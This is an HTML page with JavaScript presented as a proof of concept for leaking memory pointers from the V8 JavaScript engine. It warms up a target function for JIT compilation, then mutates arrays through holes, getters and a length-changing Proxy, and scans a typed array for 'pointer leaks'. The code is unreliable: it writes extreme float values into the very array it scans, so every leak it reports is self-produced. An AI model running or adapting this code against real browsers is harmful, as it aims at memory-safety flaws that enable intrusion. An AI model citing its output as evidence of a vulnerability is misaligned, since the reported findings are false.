<!doctype html>
<meta charset="utf-8">
<title>V8 Memory Leak PoC - Strong</title>

<h2>V8 Memory Leak PoC - Strong (Read-Only)</h2>
<pre id="log"></pre>

<script>
const log = m => {
    document.getElementById("log").textContent += m + "\n";
    console.log(m);
};

// TARGET FUNCTION
function vuln(a,i){ return a[i]+1.1; }

// WARMUP
function warmup(){
    let arr = Array.from({length:50}, (_,i)=>i+0.5);
    for(let j=0;j<150000;j++) vuln(arr,j%50);
    return arr;
}

// AGGRESSIVE MUTATION
function mutate(arr){
    // create many holes
    for(let i=0;i<15;i++) delete arr[i];
    arr.length = 10;
    arr[80] = 1.7976931348623157e+308; // extreme float
    arr[2] = {x:1}; // force object kind

    Object.defineProperty(arr,3,{
        get(){
            arr.push(Math.random()*1e5);
            return 1.1;
        }
    });
    return arr;
}

// PROXY BREAK ASSUMPTION
function breakAssumption(a){
    return new Proxy(a,{
        get(t,p){
            if(p==="length"){
                for(let i=0;i<10;i++) t.push(Math.random()*1e5);
            }
            if(typeof p==="string" && !isNaN(p) && Math.random()<0.5){
                t.push(Math.random()*1e5);
            }
            return Reflect.get(t,p);
        },
        set(t,p,v){
            if(Math.random()<0.2) t.length+=5;
            return Reflect.set(t,p,v);
        }
    });
}

// TYPED ARRAYS BESAR
let buf = new ArrayBuffer(0x40000); // 256KB
let f64 = new Float64Array(buf);

// INIT PATTERN
for(let i=0;i<f64.length;i++) f64[i] = 0x41414141 + i;

// CHECK POINTER-LEAK
function checkTyped(){
    for(let i=0;i<f64.length;i++){
        let v = f64[i];
        if(Math.abs(v)>1e12){
            log(`[POINTER-LEAK] idx=${i} val=${v}`);
        }
    }
}

// MAIN LOOP
function run(){
    log("[*] warmup / JIT");
    let base = warmup();

    log("[*] starting pointer-leak fuzzing...");
    for(let i=0;i<300000;i++){
        let arr = [...base];
        arr = mutate(arr);
        arr = breakAssumption(arr);

        vuln(arr,5);

        // overlay extreme float
        f64[i % f64.length] = 1.7976931348623157e+308;

        if(i%2000===0) checkTyped();
        if(i%1000===0) log(`iter ${i}`);
    }
    log("[*] done - pointer leak scan finished");
}

run();
</script>
